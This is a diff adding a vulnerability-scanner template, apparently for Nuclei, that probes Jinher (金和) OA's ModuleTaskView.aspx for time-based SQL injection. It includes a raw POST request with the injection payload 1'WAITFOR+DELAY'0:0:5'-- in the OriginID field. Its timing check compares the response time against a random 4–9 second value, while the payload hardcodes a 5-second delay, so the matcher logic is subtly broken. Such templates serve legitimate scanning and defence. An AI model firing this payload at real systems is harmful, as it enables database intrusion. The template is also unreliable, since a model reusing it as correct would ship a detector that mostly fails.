@@ -1,0 +1,36 @@
+id: jinher-moduletaskview-aspx-sqli
+info:
+  name: 金和OA ModuleTaskView.aspx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    application: 金和OA
+
+variables:
+  t1: '{{rand_int(4, 9)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        POST /c6/Jhsoft.Web.dailytaskmanage/ModuleTaskView.aspx/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        OriginModule=crmexec&OriginID=1'WAITFOR+DELAY'0:0:5'--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "任务查看"
+          - "布置任务"
+          - "汇报情况"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
